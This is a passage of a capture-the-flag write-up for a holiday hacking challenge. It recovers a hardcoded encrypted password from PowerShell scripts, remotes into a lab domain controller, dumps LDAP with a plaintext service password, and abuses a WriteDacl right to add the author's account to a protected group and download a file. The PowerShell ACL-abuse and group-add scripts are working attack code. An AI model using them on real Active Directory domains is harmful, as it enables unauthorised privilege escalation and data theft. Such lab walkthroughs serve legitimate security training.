+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>iuwuvckfvi@grades:~/test$ ls -l 
+total 1320
+-rw-rw---- 1 iuwuvckfvi iuwuvckfvi 1348096 Dec 29 22:27 test.tar
+</pre></div>
+</div>
+<p>extract files from the tar archive</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>iuwuvckfvi@grades:~/test$ tar  -xvf test.tar 
+./Get-NavArtifactUrl.ps1
+./Get-WorkingDirectory.ps1
+./Stop-EtwTraceCapture.ps1
+./create-knownissue-function.ps1
+........
+</pre></div>
+</div>
+<p>searching “SecureString” with grep ..</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$grep SecureString *ps1
+</pre></div>
+</div>
+<p>nothing useful except the pass to get a letsencrypt certificate .. retry with</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$grep -i passw *ps1 
+</pre></div>
+</div>
+<p>bingo ..</p>
+<div class="highlight-Powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$SecStringPassword</span> <span class="p">=</span> <span class="s2">&quot;76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA&quot;</span>
+<span class="nv">$aPass</span> <span class="p">=</span> <span class="nv">$SecStringPassword</span> <span class="p">|</span> <span class="nb">ConvertTo-SecureString</span> <span class="n">-Key</span> <span class="n">2</span><span class="p">,</span><span class="n">3</span><span class="p">,</span><span class="n">1</span><span class="p">,</span><span class="n">6</span><span class="p">,</span><span class="n">2</span><span class="p">,</span><span class="n">8</span><span class="p">,</span><span class="n">9</span><span class="p">,</span><span class="n">9</span><span class="p">,</span><span class="n">4</span><span class="p">,</span><span class="n">3</span><span class="p">,</span><span class="n">4</span><span class="p">,</span><span class="n">5</span><span class="p">,</span><span class="n">6</span><span class="p">,</span><span class="n">8</span><span class="p">,</span><span class="n">7</span><span class="p">,</span><span class="n">7</span>
+<span class="nv">$aCred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="n">-ArgumentList</span> <span class="p">(</span><span class="s2">&quot;elfu.local\remote_elf&quot;</span><span class="p">,</span> <span class="nv">$aPass</span><span class="p">)</span>
+<span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">10</span><span class="p">.</span><span class="n">128</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">53</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">Get-Process</span> <span class="p">}</span> <span class="n">-Credential</span> <span class="nv">$aCred</span> <span class="n">-Authentication</span> <span class="n">Negotiate</span> 
+</pre></div>
+</div>
+</div>
+<div class="section" id="powershell">
+<h2>powershell<a class="headerlink" href="#powershell" title="Permalink to this headline">¶</a></h2>
+<p>let’s run it in the powershell</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>iuwuvckfvi@grades:~/test$ powershell 
+PowerShell 7.2.0-rc.1
+Copyright (c) Microsoft Corporation.
+
+https://aka.ms/powershell
+Type &#39;help&#39; to get help.
+
+PS /home/iuwuvckfvi/test&gt; $SecStringPassword = &quot;76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA&quot;
+PS /home/iuwuvckfvi/test&gt; $aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
+PS /home/iuwuvckfvi/test&gt; $aCred = New-Object System.Management.Automation.PSCredential -ArgumentList (&quot;elfu.local\remote_elf&quot;, $aPass)
+PS /home/iuwuvckfvi/test&gt; Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock { Get-Process } -Credential $aCred -Authentication Negotiate 
+
+ NPM(K)    PM(M)      WS(M)     CPU(s)      Id  SI ProcessName                                                                     PSComputerName
+ ------    -----      -----     ------      --  -- -----------                                                                     --------------
+      9     4.31      10.09       0.00    1496   0 conhost                                                                         10.128.1.53
+      9     6.52      12.20       0.05    7760   0 conhost                                                                         10.128.1.53
+     25     2.53       5.41       0.00     596   0 csrss                                                                           10.128.1.53
+      9     1.70       4.49       0.00     684   1 csrss                                                                           10.128.1.53
+     32    17.25      22.66       0.00    3884   0 dfsrs                                                                           10.128.1.53
+     12     2.52       7.71       0.00    2536   0 dfssvc                                                                          10.128.1.53
+ 
+</pre></div>
+</div>
+<p>Using these exact credentials, we can try to Remote PowerShell into the Domain Controller (10.128.1.53)</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$SecStringPassword = &quot;76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA&quot;
+$aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
+$aCred = New-Object System.Management.Automation.PSCredential -ArgumentList (&quot;elfu.local\remote_elf&quot;, $aPass)
+Enter-PSSession -ComputerName 10.128.1.53 -Credential $aCred -Authentication Negotiate
+</pre></div>
+</div>
+<p>Now we have direct powershell access to that machine, and we have to try to insert our user (the one we created!) to a particular domain group, so that we can access Santa’s secret sleigh document.</p>
+</div>
+<div class="section" id="ldapdomaindump">
+<h2>ldapdomaindump<a class="headerlink" href="#ldapdomaindump" title="Permalink to this headline">¶</a></h2>
+<p>To get a better understanding of the global situation, we used <a class="reference external" href="https://github.com/dirkjanm/ldapdomaindump"><strong>ldapdomaindump</strong></a>, a tool that gives us a lot of informations about the Active Directory we are interested in using LDAP. We used <em>elfu_svc</em> account. It is already installed on the remote linux installation.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>ldapdomaindump  -u elfu.local\\elfu_svc -p Snow2021! 10.128.1.53
+</pre></div>
+</div>
+<p>This outputs a series of files. We grabbed the .html files and opened them on our computers.<br />
+You can get them here: <span class="xref myst">ch8_domain_users.html</span>, <span class="xref myst">ch8_domain_groups.html</span>, <span class="xref myst">ch8_domain_computers.html</span></p>
+<p><img alt="(LDAPDomainDump output)" src="_images/ADDumpFiles.png" /></p>
+<p>In <strong>domain_groups.html</strong> we can see some groups that may be useful to us, like <em>Domain Admins</em> and <em>Research Department</em>. Let’s see what we can do to them. We could use one of the <a class="reference external" href="https://github.com/chrisjd20/hhc21_powershell_snippets/blob/main/README.md">scripts</a> provided to us by Chris Davis in his <a class="reference external" href="https://www.youtube.com/watch?v=iMh8FTzepU4">talk</a>.<br />
+You could use the first script in the page, changing some values to match with our environment.</p>
+<div class="admonition attention">
+<p class="admonition-title">Attention</p>
+<p>You have to run this in powershell! To enter it, just use the command “powershell”.</p>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ADSI = [ADSI]&quot;LDAP://CN=Domain Admins,CN=Users,DC=elfu,DC=local&quot;
+$ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount])
+</pre></div>
+</div>
+<p>This list all users/groups who have some permissions regarding that specific object. In this case that is the <strong>Domain Admins</strong> group.<br />
+Unfortunately, there is nothing interesting in here.
+All users we have compromised have not got any special permission in this group.</p>
+</div>
+<div class="section" id="the-research-dep">
+<h2>The Research Dep.<a class="headerlink" href="#the-research-dep" title="Permalink to this headline">¶</a></h2>
+<p>We can try to query the other group that could be considered interesting, <strong>Research Department</strong>, given the fact that we have to access a research document.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ADSI = [ADSI]&quot;LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local&quot;
+$ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount])
+</pre></div>
+</div>
+<p>In the output we get this:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ActiveDirectoryRights</span> <span class="p">:</span> <span class="n">WriteDacl</span>
+<span class="n">InheritanceType</span>       <span class="p">:</span> <span class="kc">None</span>
+<span class="n">ObjectType</span>            <span class="p">:</span> <span class="mi">00000000</span><span class="o">-</span><span class="mi">0000</span><span class="o">-</span><span class="mi">0000</span><span class="o">-</span><span class="mi">0000</span><span class="o">-</span><span class="mi">000000000000</span>
+<span class="n">InheritedObjectType</span>   <span class="p">:</span> <span class="mi">00000000</span><span class="o">-</span><span class="mi">0000</span><span class="o">-</span><span class="mi">0000</span><span class="o">-</span><span class="mi">0000</span><span class="o">-</span><span class="mi">000000000000</span>
+<span class="n">ObjectFlags</span>           <span class="p">:</span> <span class="kc">None</span>
+<span class="n">AccessControlType</span>     <span class="p">:</span> <span class="n">Allow</span>
+<span class="n">IdentityReference</span>     <span class="p">:</span> <span class="n">ELFU</span>\<span class="n">remote_elf</span>
+<span class="n">IsInherited</span>           <span class="p">:</span> <span class="kc">False</span>
+<span class="n">InheritanceFlags</span>      <span class="p">:</span> <span class="kc">None</span>
+<span class="n">PropagationFlags</span>      <span class="p">:</span> <span class="kc">None</span>
+</pre></div>
+</div>
+<p>Seems like the user “<strong>remote_elf</strong>” has the <strong>WriteDacl</strong> permission, which allows us to add/remove permissions for other users for this group. We can now proceed to use the second script provided to us to by Chris Devis.</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>This script adds the <strong>GenericAll</strong> permission to a user of our choice. We should add it to the user generated by us.</p>
+</div>
+<div class="highlight-Powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span>
+<span class="nv">$ldapConnString</span> <span class="p">=</span> <span class="s2">&quot;LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local&quot;</span>
+<span class="nv">$username</span> <span class="p">=</span> <span class="s2">&quot;YOUR_USERNAME_HERE&quot;</span>
+<span class="nv">$nullGUID</span> <span class="p">=</span> <span class="no">[guid]</span><span class="s1">&#39;00000000-0000-0000-0000-000000000000&#39;</span>
+<span class="nv">$propGUID</span> <span class="p">=</span> <span class="no">[guid]</span><span class="s1">&#39;00000000-0000-0000-0000-000000000000&#39;</span>
+<span class="nv">$IdentityReference</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Principal</span><span class="p">.</span><span class="n">NTAccount</span><span class="p">(</span><span class="s2">&quot;elfu.local\$username&quot;</span><span class="p">)).</span><span class="n">Translate</span><span class="p">(</span><span class="no">[System.Security.Principal.SecurityIdentifier]</span><span class="p">)</span>
+<span class="nv">$inheritanceType</span> <span class="p">=</span> <span class="no">[System.DirectoryServices.ActiveDirectorySecurityInheritance]</span><span class="p">::</span><span class="n">None</span>
+<span class="nv">$ACE</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">ActiveDirectoryAccessRule</span> <span class="nv">$IdentityReference</span><span class="p">,</span> <span class="p">(</span><span class="no">[System.DirectoryServices.ActiveDirectoryRights]</span> <span class="s2">&quot;GenericAll&quot;</span><span class="p">),</span> <span class="p">(</span><span class="no">[System.Security.AccessControl.AccessControlType]</span> <span class="s2">&quot;Allow&quot;</span><span class="p">),</span> <span class="nv">$propGUID</span><span class="p">,</span> <span class="nv">$inheritanceType</span><span class="p">,</span> <span class="nv">$nullGUID</span>
+<span class="nv">$domainDirEntry</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectoryEntry</span> <span class="nv">$ldapConnString</span>
+<span class="nv">$secOptions</span> <span class="p">=</span> <span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">get_Options</span><span class="p">()</span>
+<span class="nv">$secOptions</span><span class="p">.</span><span class="n">SecurityMasks</span> <span class="p">=</span> <span class="no">[System.DirectoryServices.SecurityMasks]</span><span class="p">::</span><span class="n">Dacl</span>
+<span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">RefreshCache</span><span class="p">()</span>
+<span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">get_ObjectSecurity</span><span class="p">().</span><span class="n">AddAccessRule</span><span class="p">(</span><span class="nv">$ACE</span><span class="p">)</span>
+<span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">CommitChanges</span><span class="p">()</span>
+<span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">dispose</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>We can check if our action is successful with the commands we used before.</p>
+<p><em>(iqulelyrfv is my username)</em></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ADSI = [ADSI]&quot;LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local&quot;
+$ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount])
+
+ActiveDirectoryRights : GenericAll
+InheritanceType       : None
+ObjectType            : 00000000-0000-0000-0000-000000000000
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : None
+AccessControlType     : Allow
+IdentityReference     : ELFU\iqulelyrfv
+IsInherited           : False
+InheritanceFlags      : None
+PropagationFlags      : None
+</pre></div>
+</div>
+<p>It worked! Now that we have the permission to, we can add our user to that group, using the third script.</p>
+<div class="highlight-Powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span>
+<span class="nv">$ldapConnString</span> <span class="p">=</span> <span class="s2">&quot;LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local&quot;</span>
+<span class="nv">$username</span> <span class="p">=</span> <span class="s2">&quot;YOUR_USERNAME_HERE&quot;</span>
+<span class="nv">$password</span> <span class="p">=</span> <span class="s2">&quot;YOUR_PASSWORD_HERE&quot;</span>
+<span class="nv">$domainDirEntry</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectoryEntry</span> <span class="nv">$ldapConnString</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span>
+<span class="nv">$user</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Principal</span><span class="p">.</span><span class="n">NTAccount</span><span class="p">(</span><span class="s2">&quot;elfu.local\$username&quot;</span><span class="p">)</span>
+<span class="nv">$sid</span><span class="p">=</span><span class="nv">$user</span><span class="p">.</span><span class="n">Translate</span><span class="p">(</span><span class="no">[System.Security.Principal.SecurityIdentifier]</span><span class="p">)</span>
+<span class="nv">$b</span><span class="p">=</span><span class="nb">New-Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="nv">$sid</span><span class="p">.</span><span class="n">BinaryLength</span>
+<span class="nv">$sid</span><span class="p">.</span><span class="n">GetBinaryForm</span><span class="p">(</span><span class="nv">$b</span><span class="p">,</span><span class="n">0</span><span class="p">)</span>
+<span class="nv">$hexSID</span><span class="p">=</span><span class="no">[BitConverter]</span><span class="p">::</span><span class="n">ToString</span><span class="p">(</span><span class="nv">$b</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+<span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s2">&quot;LDAP://&lt;SID=$hexSID&gt;&quot;</span><span class="p">)</span>
+<span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">CommitChanges</span><span class="p">()</span>
+<span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">dispose</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>We can now access the <strong>research_dep</strong> share on <strong>10.128.3.30</strong></p>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p>It could take up to five minutes for the changes to propagate.</p>
+</div>
+</div>
+<div class="section" id="santa-pdf-finally">
+<h2>Santa PDF finally!<a class="headerlink" href="#santa-pdf-finally" title="Permalink to this headline">¶</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">smbclient</span> \\\\<span class="mf">10.128.3.30</span>\\<span class="n">research_dep</span> <span class="o">-</span><span class="n">U</span> <span class="n">ELFU</span><span class="o">.</span><span class="n">local</span>\\<span class="n">iqulelyrfv</span>
+<span class="o">==&gt;</span> <span class="n">Enter</span> <span class="n">Password</span>
+
+<span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="nb">dir</span>
+  <span class="o">.</span>                                   <span class="n">D</span>        <span class="mi">0</span>  <span class="n">Thu</span> <span class="n">Dec</span>  <span class="mi">2</span> <span class="mi">16</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">42</span> <span class="mi">2021</span>
+  <span class="o">..</span>                                  <span class="n">D</span>        <span class="mi">0</span>  <span class="n">Thu</span> <span class="n">Dec</span> <span class="mi">30</span> <span class="mi">08</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">24</span> <span class="mi">2021</span>
+  <span class="n">SantaSecretToAWonderfulHolidaySeason</span><span class="o">.</span><span class="n">pdf</span>      <span class="n">N</span>   <span class="mi">173932</span>  <span class="n">Thu</span> <span class="n">Dec</span>  <span class="mi">2</span> <span class="mi">16</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">26</span> <span class="mi">2021</span>
+
+                <span class="mi">41089256</span> <span class="n">blocks</span> <span class="n">of</span> <span class="n">size</span> <span class="mf">1024.</span> <span class="mi">34704268</span> <span class="n">blocks</span> <span class="n">available</span>
+
+<span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="n">get</span> <span class="n">SantaSecretToAWonderfulHolidaySeason</span><span class="o">.</span><span class="n">pdf</span>
+<span class="n">getting</span> <span class="n">file</span> \<span class="n">SantaSecretToAWonderfulHolidaySeason</span><span class="o">.</span><span class="n">pdf</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">173932</span> <span class="k">as</span> <span class="n">SantaSecretToAWonderfulHolidaySeason</span><span class="o">.</span><span class="n">pdf</span>
+<span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="n">exit</span>
+</pre></div>
+</div>
+<p>We have downloaded the file that we probably needed to access, <strong>SantaSecretToAWonderfulHolidaySeason.pdf</strong><br />
+Transfer it to our computer, open it and the word requested by the challenge is <strong>Kindness</strong>.</p>
+<p>Done :)</p>
+</div>
+</div>
+
+    <script type="text/x-thebe-config">
+    {
+        requestKernel: true,
+        binderOptions: {
+            repo: "binder-examples/jupyter-stacks-datascience",
+            ref: "master",
+        },
+        codeMirrorConfig: {
+            theme: "abcdef",
+            mode: "python"
+        },
+        kernelOptions: {
+            kernelName: "python3",
+            path: "./."
+        },
+        predefinedOutput: true
+    }
+    </script>
+    <script>kernelName = 'python3'</script>
+
+              </div>
+              
+        </div>
+    </div>
+    
+    
+    <div class='prev-next-bottom'>
+        
+    <a class='left-prev' id="prev-link" href="prechallenge8.html" title="previous page">HoHo… No (Fail2Ban)</a>
+    <a class='right-next' id="next-link" href="objective9.html" title="next page">9. Splunk!</a>
+
+    </div>
+    <footer class="footer mt-5 mt-md-0">
+    <div class="container">
+      <p>
+        
+          By Dani & Max<br/>
+        
+            &copy; Copyright 2021.<br/>
+      </p>
+    </div>
+  </footer>
+</main>
+
+
+      </div>
+    </div>
+
+    
+  <script src="_static/js/index.3da636dd464baa7582d2.js"></script>
+
+
+    
+  </body>
+</html>
